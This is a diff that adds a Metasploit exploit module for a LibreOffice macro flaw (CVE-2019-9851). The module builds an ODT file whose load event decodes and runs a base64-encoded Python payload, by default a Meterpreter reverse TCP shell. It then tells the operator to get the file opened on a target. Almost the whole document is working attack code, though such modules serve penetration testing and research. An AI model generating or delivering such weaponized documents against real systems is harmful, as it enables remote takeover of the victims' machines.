@@ -1,0 +1,74 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::FILEFORMAT
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'            => 'LibreOffice Macro Python Code Execution',
+      'Description'     => %q{
+        LibreOffice comes bundled with sample macros written in Python and
+        allows the ability to bind program events to them.
+
+        LibreLogo is a macro that allows a program event to execute text as Python code, allowing RCE.
+
+        This module generates an ODT file with a dom loaded event that,
+        when triggered, will execute arbitrary python code and the metasploit payload.
+      },
+      'License'         => MSF_LICENSE,
+      'Author'          =>
+        [
+          'Nils Emmerich',    # Vulnerability discovery and PoC
+          'Shelby Pace',      # Base module author (CVE-2018-16858), module reviewer and platform-independent code
+          'LoadLow',          # This msf module
+          'Gabriel Masei'     # Global events vuln. disclosure
+        ],
+      'References'      =>
+        [
+          [ 'CVE', '2019-9851' ],
+          [ 'URL', 'https://www.libreoffice.org/about-us/security/advisories/cve-2019-9848/' ],
+          [ 'URL', 'https://www.libreoffice.org/about-us/security/advisories/cve-2019-9851/' ],
+          [ 'URL', 'https://insinuator.net/2019/07/libreoffice-a-python-interpreter-code-execution-vulnerability-cve-2019-9848/' ]
+        ],
+      'DisclosureDate'  => '2019-07-16',
+      'Platform'        => 'python',
+      'Arch'            => ARCH_PYTHON,
+      'DefaultOptions'  => { 'Payload' => 'python/meterpreter/reverse_tcp' },
+      'Targets'         => [ ['Automatic', {}] ],
+      'DefaultTarget'   =>  0
+    ))
+
+    register_options(
+    [
+      OptString.new('FILENAME', [true, 'Output file name', 'librefile.odt']),
+      OptString.new('TEXT_CONTENT', [true, 'Text written in the document. It will be html encoded.', 'My Report']),
+    ])
+  end
+
+  def gen_file
+    text_content = Rex::Text.html_encode(datastore['TEXT_CONTENT'])
+    py_code = Rex::Text.encode_base64(payload.encoded)
+    @cmd = "exec(eval(str(__import__('base64').b64decode('#{py_code}'))))"
+    @cmd = Rex::Text.html_encode(@cmd)
+
+    fodt_file = File.read(File.join(Msf::Config.data_directory, 'exploits', 'CVE-2019-9848', 'librefile.erb'))
+    libre_file = ERB.new(fodt_file).result(binding())
+
+    print_status("File generated! Now you need to move the odt file and find a way to send it/open it with LibreOffice on the target.")
+
+    libre_file
+  rescue Errno::ENOENT
+    fail_with(Failure::NotFound, 'Cannot find template file')
+  end
+
+  def exploit
+    fodt_file = gen_file
+
+    file_create(fodt_file)
+  end
+end
